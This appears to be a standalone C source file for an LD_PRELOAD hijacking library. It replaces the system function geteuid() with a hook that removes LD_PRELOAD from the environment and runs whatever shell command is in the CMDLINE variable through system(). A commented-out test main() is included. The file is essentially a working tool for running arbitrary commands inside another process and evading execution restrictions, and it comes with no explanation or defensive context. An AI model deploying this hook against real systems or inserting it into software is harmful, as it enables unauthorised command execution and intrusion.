#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
int payload(char *cmd) {
    printf("Exec : %s\n", cmd);
    return system(cmd);
}   
 
int  geteuid() {
    printf("Exec : %s\n", getenv("CMDLINE"));
    if(getenv("LD_PRELOAD") == NULL) { 
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload(getenv("CMDLINE"));
}

// int main(){
//     geteuid();
//     return 0;
// }
